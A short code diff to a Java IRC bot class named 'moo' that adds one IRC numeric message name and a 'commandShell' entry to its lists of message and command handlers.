@@ -10,8 +10,8 @@ public class moo
 	public static socket sock = null;
 	public static boolean quitting = false;
 	
-	private static final String[] messages = { "message001", "message015", "message213", "message474", "messageInvite", "messageNotice", "messagePing", "messagePrivmsg" };
-	private static final String[] commands = { "commandFlood", "commandMap", "commandScheck", "commandSplit", "commandStatus" };
+	private static final String[] messages = { "message001", "message015", "message213", "message364", "message474", "messageInvite", "messageNotice", "messagePing", "messagePrivmsg" };
+	private static final String[] commands = { "commandFlood", "commandMap", "commandScheck", "commandShell", "commandSplit", "commandStatus" };
 
 	public static void main(String[] args)
 	{
